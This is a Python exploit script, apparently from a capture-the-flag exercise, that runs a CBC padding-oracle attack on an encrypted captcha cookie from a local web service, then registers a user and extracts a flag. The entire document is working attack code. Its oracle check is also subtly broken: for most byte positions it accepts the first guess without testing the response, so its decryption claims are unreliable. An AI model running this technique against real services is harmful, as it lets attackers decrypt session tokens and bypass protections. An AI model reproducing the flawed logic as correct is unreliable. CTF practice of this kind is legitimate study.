#!/usr/bin/env python3
import requests
import base64
from urllib.parse import quote

TARGET = "http://127.0.0.1:32869/"

# Fetch fresh session
print("[*] Fetching fresh captcha session...")
s = requests.Session()
r = s.get(TARGET)
captcha_cookie = s.cookies.get('captcha')
csrf_token = r.text.split('name="csrf_token" value="')[1].split('"')[0]

print(f"[+] Captcha cookie: {captcha_cookie}")
print(f"[+] CSRF token: {csrf_token}")

# Parse cookie
cookie_bytes = base64.b64decode(captcha_cookie)
iv = cookie_bytes[:16]
ct = cookie_bytes[16:]

print(f"[+] IV: {iv.hex()}")
print(f"[+] CT: {ct.hex()}")

# Padding oracle attack
def test_padding(modified_iv):
    test_cookie = base64.b64encode(modified_iv + ct).decode()
    test_s = requests.Session()
    test_s.cookies.set('captcha', test_cookie)
    test_s.cookies.set('session', s.cookies.get('session'))
    resp = test_s.post(TARGET, data={
        'username': 'test',
        'captcha': 'test',
        'csrf_token': csrf_token,
        'submit': 'Register'
    })
    return len(resp.content)

print("\n[*] Starting padding oracle attack...")
plaintext = bytearray(16)
intermediate = bytearray(16)

for pos in range(15, -1, -1):
    print(f"[*] Attacking byte {15-pos+1}/16 (position {pos})...")
    padding_value = 16 - pos
    
    # Build IV for this round
    test_iv = bytearray(iv)
    for i in range(pos + 1, 16):
        test_iv[i] = intermediate[i] ^ padding_value
    
    # Try all byte values
    for guess in range(256):
        test_iv[pos] = guess
        length = test_padding(bytes(test_iv))
        
        if guess == 0 or guess % 32 == 0:
            print(f"  Testing byte {guess}/255... (length: {length})")
        
        # Valid padding gives different response length
        if pos == 15:
            # First byte - need two checks
            if guess != iv[pos]:
                test_iv2 = bytearray(test_iv)
                test_iv2[14] ^= 1
                length2 = test_padding(bytes(test_iv2))
                if length == length2:
                    continue
        
        # Found valid padding
        intermediate[pos] = guess ^ padding_value
        plaintext[pos] = intermediate[pos] ^ iv[pos]
        print(f"[+] Found byte {15-pos+1}: 0x{plaintext[pos]:02x} ('{chr(plaintext[pos]) if 32 <= plaintext[pos] < 127 else '?'}')")
        break

# Remove PKCS7 padding
padding_len = plaintext[-1]
if 1 <= padding_len <= 16:
    plaintext = plaintext[:-padding_len]

solution = plaintext.decode('utf-8', errors='ignore')
print(f"\n[+] Decrypted CAPTCHA: {solution}")

# Register user
print("\n[*] Registering user with decrypted captcha...")
final_resp = s.post(TARGET, data={
    'username': 'hacker123',
    'captcha': solution,
    'csrf_token': csrf_token,
    'submit': 'Register'
})

print(final_resp.text)

# Extract flag
if 'FLAG{' in final_resp.text:
    flag = final_resp.text.split('FLAG{')[1].split('}')[0]
    print(f"\n[SUCCESS] FLAG{{{flag}}}")
else:
    print("\n[!] No flag found in response")
EOF
